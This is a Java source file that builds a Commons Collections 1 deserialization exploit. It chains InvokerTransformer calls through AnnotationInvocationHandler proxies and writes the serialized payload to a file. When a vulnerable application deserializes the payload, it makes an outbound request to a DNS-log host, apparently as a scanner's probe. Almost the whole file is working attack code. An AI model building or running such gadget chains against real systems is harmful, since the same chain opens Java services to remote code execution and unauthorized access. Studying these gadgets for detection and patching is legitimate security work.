package bug;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class CommonsCollections1 {

	public InvocationHandler getObject(final String ip) throws Exception {
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[] { new ConstantTransformer(1) });

		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(java.net.URL.class),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { ip } }),
				new InvokerTransformer("openStream", new Class[] {},
						new Object[] {}), new ConstantTransformer(1) };

		// final Map innerMap = new HashMap();
		//
		// final Map lazyMap = LazyMap.decorate(new HashMap(),
		// transformerChain);

		// this will generate a
		// AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
		InvocationHandler invo = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Override.class,
						LazyMap.decorate(new HashMap(), transformerChain));

		final Map mapProxy = Map.class.cast(Proxy.newProxyInstance(this
				.getClass().getClassLoader(), new Class[] { Map.class }, invo));

		final InvocationHandler handler = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Override.class, mapProxy);

		setFieldValue(transformerChain, "iTransformers", transformers);

		return handler;
	}

	public static Constructor<?> getFirstCtor(final String name)
			throws Exception {
		final Constructor<?> ctor = Class.forName(name)
				.getDeclaredConstructors()[0];
		ctor.setAccessible(true);
		return ctor;
	}

	public static Field getField(final Class<?> clazz, final String fieldName)
			throws Exception {
		Field field = clazz.getDeclaredField(fieldName);
		if (field == null && clazz.getSuperclass() != null) {
			field = getField(clazz.getSuperclass(), fieldName);
		}
		field.setAccessible(true);
		return field;
	}

	public static void setFieldValue(final Object obj, final String fieldName,
			final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}

	public static void main(final String[] args) throws Exception {

		final Object objBefore = CommonsCollections1.class.newInstance()
				.getObject("http://abc.333d61.dnslog.info/tangscan/iswin.jpg");

		File f = new File("/Users/iswin/Downloads/hello.bin");
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(objBefore);
		out.flush();
		out.close();

		// Serializables.deserialize(Serializables.serialize(objBefore));
	}
}